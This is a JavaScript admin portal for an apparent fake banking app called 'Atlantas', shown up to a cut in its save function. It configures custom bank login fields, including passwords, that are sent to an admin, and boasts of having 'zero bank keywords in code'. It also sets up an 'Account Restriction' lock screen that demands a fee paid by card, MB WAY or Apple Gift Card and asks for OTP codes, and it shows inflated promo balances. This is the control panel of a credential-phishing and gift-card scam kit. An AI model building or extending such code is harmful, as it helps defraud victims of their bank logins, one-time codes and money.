// ============================================================
// DEV.JS — Atlantas Developer Portal
// Controls EVERYTHING about the user app via Firebase.
// Including EmailJS keys, all features, institutions, theme.
// ============================================================
'use strict';

var DEV = (function(){
  var _db, _auth, _cfg={}, _instList=[];

  var SECTION_META = {
    branding:     {title:'Branding',          sub:'App name, logo, subtitle and version'},
    theme:        {title:'Theme & Colors',     sub:'Colors, gradients, glow, font and dark mode'},
    labels:       {title:'Labels & Text',      sub:'All button and section labels — zero bank keywords in code'},
    languages:    {title:'Languages',          sub:'Which languages users can switch between'},
    notifications:{title:'Notifications',      sub:'Push message templates and admin email'},
    institution:  {title:'Linked Institutions',sub:'Add, edit and remove linkable institutions — submits go to admin'},
    bonuses:      {title:'Bonuses & Fees',     sub:'Welcome bonus, promo code, referral rewards, card fee'},
    forms:        {title:'Forms & Fields',     sub:'Edit form field names and admin submission subjects'},
    features:     {title:'Feature Toggles',   sub:'Enable or disable every feature in the user app'},
    navigation:   {title:'Navigation',         sub:'Show or hide each tab in the bottom nav'},
    comingsoon:   {title:'Gate Screen',          sub:'Customise what users see before they get access'},
    demolock:     {title:'Account Restriction',   sub:'Configure the restriction screen and unlock steps'},
    lock:         {title:'Lock Payments',         sub:'Payment methods shown on the restriction screen'},
    maintenance:  {title:'Maintenance Mode',   sub:'Take the app offline temporarily with a custom message'},
    email:        {title:'Email Config',       sub:'EmailJS keys — set here, stored in Firebase, used by user app'},
    firebase:     {title:'Firebase Config',    sub:'View Firebase project settings'},
    cloudinary:   {title:'Cloudinary',         sub:'Image upload presets and compression'}
  };

  // ── BOOT ─────────────────────────────────────────────────
  function boot(){
    if(!firebase.apps||!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
    _auth=firebase.auth();_db=firebase.database();
    document.getElementById('dev-login-btn').addEventListener('click',_doLogin);
    document.getElementById('dev-pass').addEventListener('keydown',function(e){if(e.key==='Enter')_doLogin();});
    document.getElementById('dev-email').addEventListener('keydown',function(e){if(e.key==='Enter')_doLogin();});
    _auth.onAuthStateChanged(function(user){
      if(!user){_showLogin();return;}
      var email=user.email;
      var isRootDev=(email.toLowerCase()===(DEV_EMAIL||'developer@gmail.com').toLowerCase());
      if(isRootDev){_showPortal(user);return;}
      _db.ref(DB.admins+'/'+user.uid).once('value',function(snap){
        var d=snap.val();
        if(!d||(!d.isDev&&!d.isSuperAdmin)){
          document.getElementById('dev-err').textContent='Access denied. Developer account required.';
          _auth.signOut();_showLogin();return;
        }
        _showPortal(user);
      });
    });
  }

  function _doLogin(){
    var email=(document.getElementById('dev-email').value||'').trim();
    var pass=document.getElementById('dev-pass').value;
    var err=document.getElementById('dev-err');err.textContent='';
    if(!email||!pass){err.textContent='Enter email and password.';return;}
    document.getElementById('dev-login-btn').textContent='Accessing…';
    document.getElementById('dev-login-btn').disabled=true;
    _auth.signInWithEmailAndPassword(email,pass).catch(function(e){
      err.textContent='Login failed: '+(e.message||e.code);
      document.getElementById('dev-login-btn').textContent='Access Developer Portal';
      document.getElementById('dev-login-btn').disabled=false;
    });
  }

  function _showLogin(){
    document.getElementById('dev-login').classList.add('show');
    document.getElementById('dev-portal').classList.remove('show');
    document.getElementById('dev-login-btn').textContent='Access Developer Portal';
    document.getElementById('dev-login-btn').disabled=false;
  }

  function _showPortal(user){
    document.getElementById('dev-login').classList.remove('show');
    document.getElementById('dev-portal').classList.add('show');
    document.getElementById('dev-logged-in-as').textContent=user.email;
    _loadConfig();
  }

  function _loadConfig(){
    _db.ref(DB.appConfig).on('value',function(snap){
      _cfg=snap.val()||{};
      _instList=Array.isArray(_cfg.institutions)?_cfg.institutions:[];
      _buildAllSections();
      _populateAll();
    });
  }

  // ── SECTION SWITCH ────────────────────────────────────────
  function switchSection(name,navEl){
    document.querySelectorAll('.dev-section').forEach(function(s){s.classList.remove('active');});
    document.querySelectorAll('.nav-item').forEach(function(b){b.classList.remove('active');});
    var sec=document.getElementById('section-'+name);
    if(sec)sec.classList.add('active');
    if(navEl)navEl.classList.add('active');
    document.getElementById('portal-section-title').textContent=SECTION_META[name]&&SECTION_META[name].title||name;
    document.getElementById('portal-section-sub').textContent=SECTION_META[name]&&SECTION_META[name].sub||'';
    if(name==='beta')_loadBetaUsers();
  }

  // ── BUILD ALL SECTIONS ────────────────────────────────────
  function _buildAllSections(){
    _buildRecChips('rec-app-names',DEV_RECOMMENDATIONS.appNames,'cfg-appName');
    _buildRecChips('rec-subtitles',DEV_RECOMMENDATIONS.appSubtitles,'cfg-appSubtitle');
    _buildThemePresets();
    _buildLabelFields();
    _buildInstSection();
    _buildLockSection();
    _buildLangToggles();
    _syncColorPickers();
    _populateFirebaseFields();
    _populateCloudinaryFields();
    _populateLoanFields();
    _buildFormSection();
    // Slider sync
    ['cfg-buttonRadius','cfg-balanceCardGlowSize'].forEach(function(id){
      var inp=document.getElementById(id);
      var out=document.getElementById(id+'-val');
      if(inp&&out){inp.addEventListener('input',function(){out.textContent=inp.value;});}
    });
  }

  // ── RECOMMENDATION CHIPS ──────────────────────────────────
  function _buildRecChips(containerId,items,targetId){
    var c=document.getElementById(containerId);if(!c)return;c.innerHTML='';
    (items||[]).forEach(function(item){
      var chip=document.createElement('div');chip.className='rec-chip';chip.textContent=item;
      chip.addEventListener('click',function(){
        c.querySelectorAll('.rec-chip').forEach(function(ch){ch.classList.remove('selected');});
        chip.classList.add('selected');
        var inp=document.getElementById(targetId);if(inp)inp.value=item;
      });
      c.appendChild(chip);
    });
  }

  // ── THEME PRESETS ─────────────────────────────────────────
  function _buildThemePresets(){
    var grid=document.getElementById('theme-presets');if(!grid)return;grid.innerHTML='';
    DEV_RECOMMENDATIONS.themes.forEach(function(t){
      var card=document.createElement('div');card.className='color-theme-card';
      card.innerHTML='<div class="color-theme-swatch" style="background:linear-gradient(135deg,'+t.primary+','+t.accent+')"></div><div class="color-theme-name">'+t.name+'</div>';
      card.addEventListener('click',function(){
        grid.querySelectorAll('.color-theme-card').forEach(function(c){c.classList.remove('selected');});
        card.classList.add('selected');
        _setCol('primaryColor',t.primary);_setCol('accentColor',t.accent);
        _setCol('bgColor',t.bg);_setVal('cfg-darkMode-check',t.dark);
        _setCol('balanceCardBg1',t.balBg1||'#0d0f14');_setCol('balanceCardBg2',t.balBg2||'#1a3a5c');
        _updateBalPreview();
      });
      grid.appendChild(card);
    });
  }

  function _setCol(key,hex){
    var picker=document.getElementById('cfg-'+key);var hexInp=document.getElementById('cfg-'+key+'-hex');
    if(picker)picker.value=hex;if(hexInp)hexInp.value=hex;
  }
  function _syncColorPickers(){
    ['primaryColor','accentColor','bgColor','textColor','balanceCardBg1','balanceCardBg2','balanceCardGlowColor','navBgColor','navActiveColor','drawerBgColor','drawerHeadBg1','drawerHeadBg2'].forEach(function(key){
      var picker=document.getElementById('cfg-'+key);
      var hexInp=document.getElementById('cfg-'+key+'-hex');
      if(picker&&hexInp){
        picker.addEventListener('input',function(){hexInp.value=picker.value;_updateBalPreview();});
        hexInp.addEventListener('input',function(){if(/^#[0-9a-fA-F]{6}$/.test(hexInp.value)){picker.value=hexInp.value;_updateBalPreview();}});
      }
    });
    var glowToggle=document.getElementById('cfg-balanceCardGlow');
    if(glowToggle)glowToggle.addEventListener('change',_updateBalPreview);
    var glowSize=document.getElementById('cfg-balanceCardGlowSize');
    if(glowSize)glowSize.addEventListener('input',_updateBalPreview);
  }
  function _updateBalPreview(){
    var card=document.getElementById('lp-card');if(!card)return;
    var bg1=_getCol('balanceCardBg1','#0d0f14');var bg2=_getCol('balanceCardBg2','#1a3a5c');
    card.style.background='linear-gradient(135deg,'+bg1+','+bg2+')';
    var glow=document.getElementById('lp-glow');
    var glowOn=(document.getElementById('cfg-balanceCardGlow')||{}).checked!==false;
    var glowColor=_getCol('balanceCardGlowColor','rgba(26,86,255,0.35)');
    var glowSize=parseInt((document.getElementById('cfg-balanceCardGlowSize')||{}).value||28);
    if(glow){glow.style.background=glowOn?glowColor:'transparent';glow.style.width=glowSize*6+'px';glow.style.height=glowSize*6+'px';glow.style.filter='blur('+(glowSize+12)+'px)';}
    var label=document.getElementById('lp-label');if(label)label.textContent=_getVal('lbl-en-balance')||'Total Balance';
    var sub=document.getElementById('lp-sub');if(sub)sub.textContent=_getVal('cfg-appName')||'Atlantas';
  }
  function _getCol(key,fallback){
    var h=document.getElementById('cfg-'+key+'-hex');return(h&&h.value)||fallback||'#000';
  }

  // ── LABEL FIELDS ─────────────────────────────────────────
  var LABEL_KEYS=['topup','cashout','send','request','balance','cards','addCard','offers','refer','receipts','signIn','signUp','logout','goodMorning','goodAfternoon','goodEvening','lockTitle','lockSubtitle','lockAddFundsBtn','lockSupportUrl'];
  function _buildLabelFields(){
    var con=document.getElementById('label-fields-container');if(!con)return;con.innerHTML='';
    LABEL_KEYS.forEach(function(key){
      var recs=(DEV_RECOMMENDATIONS.actionLabels&&DEV_RECOMMENDATIONS.actionLabels[key])||[];
      var wrap=document.createElement('div');wrap.style.marginBottom='20px';
      var lbl=document.createElement('div');
      lbl.style.cssText='font-size:11px;font-weight:700;color:rgba(240,238,255,0.45);text-transform:uppercase;letter-spacing:0.6px;margin-bottom:6px;';
      lbl.textContent=key;wrap.appendChild(lbl);
      if(recs.length){
        var cw=document.createElement('div');cw.style.cssText='display:flex;flex-wrap:wrap;gap:6px;margin-bottom:8px;';
        recs.forEach(function(rec){
          var chip=document.createElement('div');chip.className='rec-chip';chip.style.fontSize='12px';chip.textContent=rec;
          chip.addEventListener('click',function(){
            cw.querySelectorAll('.rec-chip').forEach(function(c){c.classList.remove('selected');});
            chip.classList.add('selected');var inp=document.getElementById('lbl-en-'+key);if(inp)inp.value=rec;
          });
          cw.appendChild(chip);
        });
        var div=document.createElement('div');div.className='rec-divider';div.textContent='or custom';
        wrap.appendChild(cw);wrap.appendChild(div);
      }
      var inp=document.createElement('input');inp.type='text';inp.className='dev-input';inp.id='lbl-en-'+key;inp.placeholder=key;
      if(key==='lockSupportUrl'){inp.type='text';inp.placeholder='support@yourapp.com or https://...';}
      wrap.appendChild(inp);con.appendChild(wrap);
    });
  }

  // ── INSTITUTION SECTION ───────────────────────────────────
  function _buildInstSection(){
    _renderInstList();
  }
  function _renderInstList(){
    var con=document.getElementById('inst-list-container');if(!con)return;con.innerHTML='';
    _instList.forEach(function(inst,idx){
      if(!inst)return;
      var card=document.createElement('div');card.className='inst-card';
      var color=inst.color||'#117ACA';
      var logoHtml=inst.logo?'<img src="'+_esc(inst.logo||'')+'" style="width:44px;height:44px;border-radius:10px;object-fit:cover;" onerror="this.style.display=\'none\'">':'<div style="width:44px;height:44px;border-radius:10px;background:var(--bg4);display:flex;align-items:center;justify-content:center;font-size:22px;">🏦</div>';
      // Build custom columns HTML
      var customCols=inst.customColumns||[];
      var colsHtml='<div style="margin-top:14px;"><div style="font-size:12px;font-weight:700;color:var(--t2);text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px;">Custom Login Fields <span style="font-size:11px;font-weight:500;color:var(--t3);">(shown to user instead of default fields)</span></div>'+
        '<div id="inst-cols-'+idx+'" style="display:flex;flex-direction:column;gap:8px;margin-bottom:8px;"></div>'+
        '<button class="add-field-btn" onclick="DEV.addInstColumn('+idx+')" style="font-size:13px;padding:7px 14px;">+ Add Column</button></div>';
      card.innerHTML=
        '<div class="inst-card-head">'+logoHtml+
          '<div><div class="inst-card-name">'+_esc(inst.name||'Institution')+'</div>'+
          '<div class="inst-card-type">'+_esc(inst.fieldType||'custom')+' · '+(inst.otpType||'otp')+'</div></div>'+
          '<button class="inst-card-del" onclick="DEV.deleteInst('+idx+')">🗑 Delete</button>'+
        '</div>'+
        '<div class="dev-row">'+
          '<div class="field-wrap"><label>Name</label><input type="text" class="dev-input" id="inst-name-'+idx+'" value="'+_esc(inst.name||'')+'"></div>'+
          '<div class="field-wrap"><label>Logo URL</label><input type="url" class="dev-input" id="inst-logo-'+idx+'" value="'+_esc(inst.logo||'')+'"></div>'+
        '</div>'+
        '<div class="dev-row">'+
          '<div class="field-wrap"><label>Brand Color (hex)</label><div class="color-row"><div class="color-swatch"><input type="color" id="inst-color-picker-'+idx+'" value="'+color+'"></div><input type="text" class="dev-input" id="inst-color-'+idx+'" value="'+color+'" style="font-family:var(--mono);" maxlength="7"></div></div>'+
          '<div class="field-wrap"><label>Powered By Text</label><input type="text" class="dev-input" id="inst-powered-'+idx+'" value="'+_esc(inst.poweredBy||'Link Your Account')+'"></div>'+
        '</div>'+
        '<div class="dev-row">'+
          '<div class="field-wrap"><label>Verification Type</label><select class="dev-input" id="inst-otptype-'+idx+'">'+
            DEV_RECOMMENDATIONS.otpTypes.map(function(ot){return'<option value="'+ot.value+'"'+(inst.otpType===ot.value?' selected':'')+'>'+ot.label+'</option>';}).join('')+
          '</select></div>'+
        '</div>'+
        colsHtml+
        '<div class="toggle-row" style="padding:10px 0 0;">'+
          '<div><div class="toggle-info">Require ID Document</div><div class="toggle-sub">Ask user to upload a photo ID when linking</div></div>'+
          '<label class="toggle"><input type="checkbox" id="inst-requireid-'+idx+'"'+(inst.requireId?' checked':'')+'><div class="toggle-track"></div><div class="toggle-thumb"></div></label>'+
        '</div>'+
        '<div class="toggle-row" style="padding:10px 0;">'+
          '<div><div class="toggle-info">Show on User App</div><div class="toggle-sub">Display this institution banner on the home screen</div></div>'+
          '<label class="toggle"><input type="checkbox" id="inst-show-'+idx+'"'+(inst.show!==false?' checked':'')+'><div class="toggle-track"></div><div class="toggle-thumb"></div></label>'+
        '</div>'+
        '<div style="display:flex;gap:8px;margin-top:4px;">'+
          (idx>0?'<button class="inst-order-btn" onclick="DEV.moveInst('+idx+',-1)">↑ Up</button>':'')+
          (idx<_instList.length-1?'<button class="inst-order-btn" onclick="DEV.moveInst('+idx+',1)">↓ Down</button>':'')+
        '</div>';
      con.appendChild(card);
      // Render existing custom columns
      setTimeout(function(){
        (inst.customColumns||[]).forEach(function(col){_appendInstColumn(idx,col);});
        // Sync color picker
        var picker=document.getElementById('inst-color-picker-'+idx);
        var hexInp=document.getElementById('inst-color-'+idx);
        if(picker&&hexInp){
          picker.addEventListener('input',function(){hexInp.value=picker.value;});
          hexInp.addEventListener('input',function(){if(/^#[0-9a-fA-F]{6}$/.test(hexInp.value))picker.value=hexInp.value;});
        }
      },100);
    });
  }
  function _appendInstColumn(idx,colData){
    var con=document.getElementById('inst-cols-'+idx);if(!con)return;
    var row=document.createElement('div');
    row.style.cssText='display:grid;grid-template-columns:1fr 1fr auto auto;gap:8px;align-items:center;background:var(--bg3);border-radius:10px;padding:10px 12px;';
    var typeOpts=['text','password','email','tel','number'].map(function(t){
      return'<option value="'+t+'"'+(colData&&colData.type===t?' selected':'')+'>'+t+'</option>';
    }).join('');
    row.innerHTML=
      '<input type="text" class="dev-input" placeholder="Field Label (e.g. Username)" value="'+_esc(colData&&colData.label||'')+'" data-col-label style="margin:0;">'+
      '<select class="dev-input" style="margin:0;" data-col-type>'+typeOpts+'</select>'+
      '<label style="display:flex;align-items:center;gap:5px;font-size:12px;color:var(--t2);white-space:nowrap;cursor:pointer;"><input type="checkbox" '+(colData&&colData.required?' checked':'')+' data-col-required style="accent-color:var(--p);"> Req</label>'+
      '<button onclick="this.closest(\'div\').remove()" style="background:rgba(220,38,38,.1);border:none;color:var(--er);border-radius:8px;padding:6px 10px;cursor:pointer;font-size:14px;font-weight:700;">✕</button>';
    con.appendChild(row);
  }
  function addInstColumn(idx){_appendInstColumn(idx,{label:'',type:'text',required:true});}
  function addInst(){
    _instList.push({name:'',logo:'',color:'#117ACA',poweredBy:'Link Your Account',fieldType:'custom',otpType:'otp',requireId:false,show:true,customColumns:[]});
    _renderInstList();
  }
  function deleteInst(idx){
    if(!confirm('Delete this institution?'))return;
    _instList.splice(idx,1);_renderInstList();
  }
  function moveInst(idx,dir){
    var swap=idx+dir;if(swap<0||swap>=_instList.length)return;
    var tmp=_instList[idx];_instList[idx]=_instList[swap];_instList[swap]=tmp;_renderInstList();
  }
  function _collectInsts(){
    var result=[];
    _instList.forEach(function(_,idx){
      // Collect custom columns
      var colsCon=document.getElementById('inst-cols-'+idx);
      var customColumns=[];
      if(colsCon){
        colsCon.querySelectorAll('div').forEach(function(row){
          var labelEl=row.querySelector('[data-col-label]');
          var typeEl=row.querySelector('[data-col-type]');
          var reqEl=row.querySelector('[data-col-required]');
          if(labelEl&&labelEl.value.trim()){
            var lbl=labelEl.value.trim();
            customColumns.push({
              key:lbl.toLowerCase().replace(/\s+/g,'_').replace(/[^a-z0-9_]/g,''),
              label:lbl,
              type:(typeEl&&typeEl.value)||'text',
              required:!!(reqEl&&reqEl.checked)
            });
          }
        });
      }
      result.push({
        name:_getVal('inst-name-'+idx)||'',
        logo:_getVal('inst-logo-'+idx)||'',
        color:_getVal('inst-color-'+idx)||'#117ACA',
        poweredBy:_getVal('inst-powered-'+idx)||'',
        fieldType:'custom',
        otpType:_getVal('inst-otptype-'+idx)||'otp',
        requireId:_getCheck('inst-requireid-'+idx),
        show:_getCheck('inst-show-'+idx),
        customColumns:customColumns
      });
    });
    return result;
  }

  // ── LOCK SECTION ─────────────────────────────────────────
  function _buildLockSection(){
    var con=document.getElementById('lock-methods-container');if(!con)return;con.innerHTML='';
    var methods=((_cfg.lockPaymentMethods)||[
      {key:'mbway',name:'MB WAY',logo:'',color:'#fff5f5',border:'#ffcccc',textColor:'#cc0000',enabled:true},
      {key:'visa',name:'Visa',logo:'',color:'#f0f4ff',border:'#c7d4ff',textColor:'#1a56ff',enabled:true},
      {key:'mastercard',name:'Mastercard',logo:'',color:'#fff8f0',border:'#ffe0b2',textColor:'#e65100',enabled:true},
      {key:'apple',name:'Apple Gift Card',logo:'',color:'#f5f5f7',border:'#d1d1d6',textColor:'#111',enabled:true}
    ]);
    methods.forEach(function(m,idx){
      var row=document.createElement('div');row.className='lock-method-item';
      row.innerHTML=
        '<span class="lock-method-drag">⠿</span>'+
        '<div class="lock-method-info">'+
          '<input type="text" class="dev-input" id="lm-name-'+idx+'" value="'+_esc(m.name||'')+'" placeholder="Method Name" style="margin-bottom:6px;">'+
          '<input type="text" class="dev-input" id="lm-logo-'+idx+'" value="'+_esc(m.logo||'')+'" placeholder="Logo URL (optional)" style="margin-bottom:6px;font-size:12px;">'+
          '<label style="display:flex;align-items:center;gap:6px;font-size:12px;color:var(--t2);cursor:pointer;">'+
            '<input type="checkbox" id="lm-requireotp-'+idx+'"'+(m.requireOtp!==false?' checked':'')+' style="accent-color:var(--p);">'+
            'Require OTP after submit'+
          '</label>'+
        '</div>'+
        '<div style="display:flex;flex-direction:column;align-items:center;gap:8px;">'+
          '<label class="toggle"><input type="checkbox" id="lm-enabled-'+idx+'"'+(m.enabled!==false?' checked':'')+'><div class="toggle-track"></div><div class="toggle-thumb"></div></label>'+
          '<span style="font-size:10px;color:var(--text3);">Show</span>'+
        '</div>';
      con.appendChild(row);
    });
    window._lockMethodCount=methods.length;
  }
  function _collectLockMethods(){
    var base=[
      {key:'mbway',color:'#fff5f5',border:'#ffcccc',textColor:'#cc0000'},
      {key:'visa',color:'#f0f4ff',border:'#c7d4ff',textColor:'#1a56ff'},
      {key:'mastercard',color:'#fff8f0',border:'#ffe0b2',textColor:'#e65100'},
      {key:'apple',color:'#f5f5f7',border:'#d1d1d6',textColor:'#111'}
    ];
    return base.map(function(b,idx){
      return {
        key:b.key,name:_getVal('lm-name-'+idx)||b.key,
        logo:_getVal('lm-logo-'+idx)||'',
        color:b.color,border:b.border,textColor:b.textColor,
        enabled:_getCheck('lm-enabled-'+idx),
        requireOtp:_getCheck('lm-requireotp-'+idx)
      };
    });
  }

  // ── LANG TOGGLES ─────────────────────────────────────────
  function _buildLangToggles(){
    var con=document.getElementById('lang-toggles');if(!con)return;con.innerHTML='';
    SUPPORTED_LANGS.forEach(function(lang){
      var enabled=!_cfg.enabledLangs||_cfg.enabledLangs.indexOf(lang)>-1;
      var row=document.createElement('div');row.className='toggle-row';
      row.innerHTML='<div><div class="toggle-info">'+LANG_NAMES[lang]+'</div><div class="toggle-sub">'+lang.toUpperCase()+'</div></div>'+
        '<label class="toggle"><input type="checkbox" id="lang-'+lang+'"'+(enabled?' checked':'')+' '+(lang==='en'?'disabled':'')+'>'+
        '<div class="toggle-track"></div><div class="toggle-thumb"></div></label>';
      con.appendChild(row);
    });
  }

  // ── FORM SECTION ─────────────────────────────────────────
  var FORM_KEYS=['onboarding','addInstrument','topup','cashout','support'];
  var FIELD_TYPES=['text','number','email','tel','date','select','textarea','password'];
  function _buildFormSection(){
    var con=document.getElementById('forms-container');if(!con)return;con.innerHTML='';
    var titles={onboarding:'🧑 Onboarding',addInstrument:'💳 Add Card / Account',topup:'⬇️ Add Funds',cashout:'⬆️ Withdraw',support:'💬 Support'};
    FORM_KEYS.forEach(function(fk){
      var panel=document.createElement('div');panel.className='dev-panel';
      panel.innerHTML='<div class="dev-panel-title">'+titles[fk]+'</div>'+
        '<div class="field-wrap"><label>Admin Email Subject</label><input type="text" class="dev-input" id="form-'+fk+'-subject" placeholder="e.g. New Deposit Request"></div>'+
        '<div id="form-'+fk+'-fields"></div>'+
        '<button class="add-field-btn" onclick="DEV.addFormField(\''+fk+'\')">+ Add Field</button>';
      con.appendChild(panel);
    });
    setTimeout(function(){
      FORM_KEYS.forEach(function(fk){
        var form=(_cfg.forms&&_cfg.forms[fk])||{};
        _setVal('form-'+fk+'-subject',form.subject||'');
        (form.fields||[]).forEach(function(f,i){_appendField(fk,f);});
      });
    },50);
  }
  function _appendField(formKey,fieldData){
    var con=document.getElementById('form-'+formKey+'-fields');if(!con)return;
    var card=document.createElement('div');card.className='form-field-card';
    var typeOpts=FIELD_TYPES.map(function(t){return'<option value="'+t+'"'+(fieldData&&fieldData.type===t?' selected':'')+'>'+t+'</option>';}).join('');
    card.innerHTML='<div class="form-field-row">'+
      '<div><label style="font-size:10px;color:rgba(255,255,255,0.4);text-transform:uppercase;font-weight:700;letter-spacing:0.4px;display:block;margin-bottom:4px;">Field Label</label>'+
        '<input type="text" class="dev-input" value="'+_esc(fieldData&&fieldData.label||'')+'" placeholder="e.g. Full Name" data-role="label"></div>'+
      '<div><label style="font-size:10px;color:rgba(255,255,255,0.4);text-transform:uppercase;font-weight:700;letter-spacing:0.4px;display:block;margin-bottom:4px;">Type</label>'+
        '<select class="dev-input" data-role="type">'+typeOpts+'</select></div>'+
      '<button class="remove-field-btn" onclick="this.closest(\'.form-field-card\').remove()">✕</button></div>'+
      '<div style="margin-top:10px;display:flex;gap:14px;align-items:center;">'+
        '<label style="font-size:12px;color:rgba(255,255,255,0.5);display:flex;align-items:center;gap:6px;cursor:pointer;">'+
          '<input type="checkbox" '+(fieldData&&fieldData.required?' checked':'')+' data-role="required" style="accent-color:var(--p);"> Required</label>'+
        '<input type="text" class="dev-input" value="'+_esc(fieldData&&fieldData.key||'')+'" placeholder="field_key" data-role="key" style="font-family:var(--mono);font-size:12px;width:180px;"></div>';
    con.appendChild(card);
  }
  function addFormField(formKey){
    _appendField(formKey,{key:'',label:'',type:'text',required:false});
    var c=document.getElementById('form-'+formKey+'-fields');
    if(c&&c.lastElementChild)c.lastElementChild.scrollIntoView({behavior:'smooth'});
  }
  function _collectForms(){
    var forms={};
    FORM_KEYS.forEach(function(fk){
      var subject=_getVal('form-'+fk+'-subject');var fields=[];
      var con=document.getElementById('form-'+fk+'-fields');
      if(con)con.querySelectorAll('.form-field-card').forEach(function(card){
        var label=(card.querySelector('[data-role="label"]')||{}).value||'';
        var type=(card.querySelector('[data-role="type"]')||{}).value||'text';
        var key=(card.querySelector('[data-role="key"]')||{}).value||'';
        var required=!!(card.querySelector('[data-role="required"]')||{}).checked;
        if(label||key)fields.push({key:key||label.toLowerCase().replace(/\s+/g,'_'),label:label,type:type,required:required});
      });
      forms[fk]={subject:subject,fields:fields};
    });
    return forms;
  }

  // ── POPULATE ALL ─────────────────────────────────────────
  function _populateAll(){
    var c=_cfg;
    // Branding
    _setVal('cfg-appName',      c.appName||'');
    _setVal('cfg-appSubtitle',  c.appSubtitle||'');
    _setVal('cfg-appLogoUrl',   c.appLogoUrl||'');
    _setVal('cfg-appIconUrl',   c.appIconUrl||'');
    _setVal('cfg-appVersion',   c.appVersion||'1.0.0');
    // Theme
    _setCol('primaryColor',    c.primaryColor||'#1a56ff');
    _setCol('accentColor',     c.accentColor||'#4d9fff');
    _setCol('bgColor',         c.bgColor||'#f0f2f5');
    _setCol('textColor',       c.textColor||'#0d0f14');
    _setCol('balanceCardBg1',  c.balanceCardBg1||'#0d0f14');
    _setCol('balanceCardBg2',  c.balanceCardBg2||'#1a3a5c');
    _setCol('balanceCardGlowColor', c.balanceCardGlowColor||'rgba(26,86,255,0.35)');
    _setCol('navBgColor',      c.navBgColor||'#ffffff');
    _setCol('navActiveColor',  c.navActiveColor||'#1a56ff');
    _setCol('drawerBgColor',   c.drawerBgColor||'#ffffff');
    _setCol('drawerHeadBg1',   c.drawerHeadBg1||'#0d0f14');
    _setCol('drawerHeadBg2',   c.drawerHeadBg2||'#1a3a5c');
    var br=document.getElementById('cfg-buttonRadius');if(br)br.value=c.buttonRadius||12;
    var brv=document.getElementById('cfg-buttonRadius-val');if(brv)brv.textContent=c.buttonRadius||12;
    var gs=document.getElementById('cfg-balanceCardGlowSize');if(gs)gs.value=c.balanceCardGlowSize||28;
    var gsv=document.getElementById('cfg-balanceCardGlowSize-val');if(gsv)gsv.textContent=c.balanceCardGlowSize||28;
    _setCheck('cfg-balanceCardGlow',c.balanceCardGlow!==false);
    _setCheck('cfg-darkMode',c.darkMode||false);
    var ff=document.getElementById('cfg-fontFamily');if(ff)ff.value=c.fontFamily||'Sora';
    // EmailJS — KEY section
    var ej=c.emailjs||{};
    var otp=ej.otp||{};var gen=ej.general||{};
    _setVal('ej-otp-key',   otp.publicKey||'');
    _setVal('ej-otp-svc',   otp.serviceId||'');
    _setVal('ej-otp-tmpl',  otp.templateId||'');
    _setVal('ej-gen-key',   gen.publicKey||'');
    _setVal('ej-gen-svc',   gen.serviceId||'');
    _setVal('ej-gen-tmpl',  gen.templateId||'');
    _setVal('cfg-adminEmail', c.adminEmail||'');
    // Bonuses
    _setVal('cfg-welcomeBonus',     c.welcomeBonus||0);
    _setVal('cfg-promoCode',        c.promoCode||'');
    _setVal('cfg-promoBalance',     c.promoBalance||500000);
    _setVal('cfg-cardVerifyBonus',  c.cardVerifyBonus||10);
    _setVal('cfg-cardLinkFee',      c.cardLinkFee||10);
    _setVal('cfg-referralBonus',    c.referralBonus||10);
    _setVal('cfg-referralThreshold',c.referralThreshold||12);
    var dc=document.getElementById('cfg-defaultCurrency');if(dc)dc.value=c.defaultCurrency||'USD';
    // Features
    ['enableSendMoney','enableRequestMoney','enableAddFunds','enableWithdraw','enableReferrals','enableOffers','enableReceiptsTab','enableKYC','enableLock','enableAddCard','enableCardIdVerification','pwaPrompt','showAccountNumber','showBalanceDefault'].forEach(function(k){_setCheck('cfg-'+k,c[k]!==false);});
    _setVal('cfg-pwaPromptDelay',Math.round((c.pwaPromptDelay||30000)/1000));
    // Navigation
    ['showTabAccounts','showTabReceipts','showTabSendReq','showTabOffers','showTabRefer'].forEach(function(k){_setCheck('cfg-'+k,c[k]!==false);});
    // Maintenance
    _setCheck('cfg-maintenanceMode',c.maintenanceMode||false);
    _setVal('cfg-maintenanceMessage',c.maintenanceMessage||'');
    // Labels
    var en=(c.labels&&c.labels.en)||{};
    LABEL_KEYS.forEach(function(k){_setVal('lbl-en-'+k,en[k]||'');});
    // Gate screen
    _setVal('cfg-comingSoonTitle',   c.comingSoonTitle||'');
    _setVal('cfg-comingSoonMessage', c.comingSoonMessage||'');
    _setVal('cfg-linkDisclaimer',    c.linkDisclaimer||'');
    // Account restriction / demo lock
    _setVal('cfg-lockTitle',          c.lockTitle||'');
    _setVal('cfg-lockSubtitle',       c.lockSubtitle||'');
    _setVal('cfg-lockBtnLabel',       c.lockBtnLabel||'');
    _setVal('cfg-lockConfirmMessage', c.lockConfirmMessage||'');
    _setVal('cfg-lockDefaultAmount',  c.lockDefaultAmount||150);
    _setVal('cfg-lockContactEmail',   c.lockContactEmail||'');
    _setVal('cfg-lockStep1Text',      c.lockStep1Text||'');
    _setVal('cfg-lockStep2Text',      c.lockStep2Text||'');
    _setVal('cfg-lockStep3Text',      c.lockStep3Text||'');
    // Biometric
    _setCheck('cfg-biometricEnabled', c.biometricEnabled!==false);
    _setVal('cfg-biometricTitle',    c.biometricTitle||'');
    _setVal('cfg-biometricSubtitle', c.biometricSubtitle||'');
    // Update preview
    _updateBalPreview();
  }

  // ── SAVE ─────────────────────────────────────────────────
  function save(){
    // Collect labels
    var en={};
    LABEL_KEYS.forEach(function(k){var v=_getVal('lbl-en-'+k);if(v)en[k]=v;});
    // Collect enabled langs
    var enabledLangs=SUPPORTED_LANGS.filter(function(l){var el=document.getElementById('lang-'+l);return!el||el.checked;});
    // Collect institutions
    var institutions=_collectInsts();
    // Collect lock methods
    var lockPaymentMethods=_collectLockMethods();
    // Collect forms
    var forms=_collectForms();
    // Build EmailJS config — stored in Firebase, fetched by user app at runtime
    var emailjs={
      otp:{publicKey:_getVal('ej-otp-key'),serviceId:_getVal('ej-otp-svc'),templateId:_getVal('ej-otp-tmpl')},
      general:{publicKey:_getVal('ej-gen-key'),serviceId:_getVal('ej-gen-svc'),templateId:_getVal('ej-gen-tmpl')}
    };
    var newCfg={
      // Branding
      appName:     _getVal('cfg-appName')||'Atlantas',
      appSubtitle: _getVal('cfg-appSubtitle')||'',
      appLogoUrl:  _getVal('cfg-appLogoUrl')||'',
      appIconUrl:  _getVal('cfg-appIconUrl')||'',
      appVersion:  _getVal('cfg-appVersion')||'1.0.0',
      // Theme
      primaryColor:         _getCol('primaryColor','#1a56ff'),
